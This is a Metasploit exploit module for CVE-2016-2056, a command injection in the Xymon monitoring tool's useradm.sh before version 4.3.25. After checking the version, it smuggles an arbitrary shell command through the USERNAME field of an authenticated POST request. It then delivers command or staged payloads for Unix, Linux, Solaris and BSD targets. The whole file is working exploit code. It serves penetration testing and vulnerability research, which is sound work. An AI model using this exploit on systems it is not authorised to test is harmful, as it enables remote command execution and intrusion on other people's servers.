# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Xymon useradm Command Execution&#039;,
      &#039;Description&#039; => %q{
        This module exploits a command injection vulnerability in Xymon
        versions before 4.3.25 which allows authenticated users
        to execute arbitrary operating system commands as the web
        server user.

        When adding a new user to the system via the web interface with
        `useradm.sh`, the user&#039;s username and password are passed to
        `htpasswd` in a call to `system()` without validation.

        This module has been tested successfully on Xymon version 4.3.10
        on Debian 6.
      },
      &#039;License&#039;     => MSF_LICENSE,
      &#039;Author&#039;      => [
        &#039;Markus Krell&#039;, # Discovery
        &#039;bcoles&#039;        # Metasploit
      ],
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2016-2056&#039;],
          [&#039;PACKETSTORM&#039;, &#039;135758&#039;],
          [&#039;URL&#039;, &#039;https://lists.xymon.com/pipermail/xymon/2016-February/042986.html&#039;],
          [&#039;URL&#039;, &#039;https://www.securityfocus.com/archive/1/537522/100/0/threaded&#039;],
          [&#039;URL&#039;, &#039;https://sourceforge.net/p/xymon/code/7892/&#039;],
          [&#039;URL&#039;, &#039;https://www.debian.org/security/2016/dsa-3495&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;2016-02-14&#039;,
      &#039;Platform&#039;       => %w(unix linux solaris bsd),
      &#039;Targets&#039;        =>
        [
          [
            &#039;Unix CMD&#039;,
            {
              &#039;Platform&#039; => &#039;unix&#039;,
              &#039;Arch&#039; => ARCH_CMD,
              &#039;Payload&#039; => {
                &#039;Space&#039; => 2048,
                &#039;BadChars&#039; => "\x00\x0A\x0D",
                &#039;DisableNops&#039; => true,
                &#039;Compat&#039; =>
                {
                  &#039;PayloadType&#039; => &#039;cmd&#039;,
                  &#039;RequiredCmd&#039; => &#039;generic perl python netcat php&#039;
                }
              }
            }
          ],
          [
            &#039;Linux&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039;     => [ARCH_X86,ARCH_X64],
            }
          ],
          [
            &#039;Solaris&#039;,
            {
              &#039;Platform&#039; => &#039;solaris&#039;,
              &#039;Arch&#039; => [ARCH_X86]
            }
          ],
          [
            &#039;BSD&#039;,
            {
              &#039;Platform&#039; => &#039;bsd&#039;,
              &#039;Arch&#039; => [ARCH_X86, ARCH_X64]
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DefaultTarget&#039;  => 0))
    register_options([
      OptString.new(&#039;TARGETURI&#039;, [
        true, &#039;The base path to Xymon secure CGI directory&#039;, &#039;/xymon-seccgi/&#039;
      ]),
      OptString.new(&#039;USERNAME&#039;, [true, &#039;The username for Xymon&#039;]),
      OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password for Xymon&#039;])
    ])
  end

  def user
    datastore[&#039;USERNAME&#039;]
  end

  def pass
    datastore[&#039;PASSWORD&#039;]
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;useradm.sh&#039;),
      &#039;authorization&#039; => basic_auth(user, pass)
    })

    unless res
      vprint_status "#{peer} - Connection failed"
      return CheckCode::Unknown
    end

    if res.code == 401
      vprint_status "#{peer} - Authentication failed"
      return CheckCode::Unknown
    end

    if res.code == 404
      vprint_status "#{peer} - useradm.sh not found"
      return CheckCode::Safe
    end

    unless res.body.include?(&#039;Xymon&#039;)
      vprint_status "#{peer} - Target is not a Xymon server."
      return CheckCode::Safe
    end

    version = res.body.scan(/>Xymon ([\d\.]+)</).flatten.first

    unless version
      vprint_status "#{peer} - Could not determine Xymon version"
      return CheckCode::Detected
    end

    vprint_status "#{peer} - Xymon version #{version}"

    if Gem::Version.new(version) >= Gem::Version.new(&#039;4.3.25&#039;)
      return CheckCode::Safe
    end

    CheckCode::Appears
  end

  def execute_command(cmd, opts = {})
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;useradm.sh&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;authorization&#039; => basic_auth(user, pass),
      &#039;vars_post&#039; => Hash[{
        &#039;USERNAME&#039;   => "&#039;;#{cmd} & echo &#039;",
        &#039;PASSWORD&#039;   => &#039;&#039;,
        &#039;SendCreate&#039; => &#039;Create&#039;
      }.to_a.shuffle]
    }, 5)

    return if session_created?

    unless res
      fail_with(Failure::Unreachable, &#039;Connection failed&#039;)
    end

    if res.code == 401
      fail_with(Failure::NoAccess, &#039;Authentication failed&#039;)
    end

    unless res.code == 500
      fail_with(Failure::Unknown, &#039;Unexpected reply&#039;)
    end

    print_good "#{peer} - Payload sent successfully"

    res
  end

  def exploit
    unless [Exploit::CheckCode::Detected, Exploit::CheckCode::Appears].include?(check)
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end

    if payload.arch.first == &#039;cmd&#039;
      execute_command(payload.encoded)
    else
      execute_cmdstager(linemax: 1_500)
    end
  end
end

